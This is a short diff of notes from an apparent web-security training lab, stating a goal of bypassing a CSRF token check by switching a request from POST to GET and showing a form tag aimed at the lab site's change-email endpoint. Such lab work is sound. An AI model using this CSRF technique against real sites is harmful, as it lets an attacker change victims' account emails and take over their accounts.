@@ -1,4 +1,4 @@
- GOAL: bypass csrf token submission by chaging request method
+ GOAL: bypass csrf token submission by chaging request method from POST to GET
    
     
     <form action="https://ac811fa71fceb865c0363ee7007c00db.web-security-academy.net/my-account/change-email" method="GET">
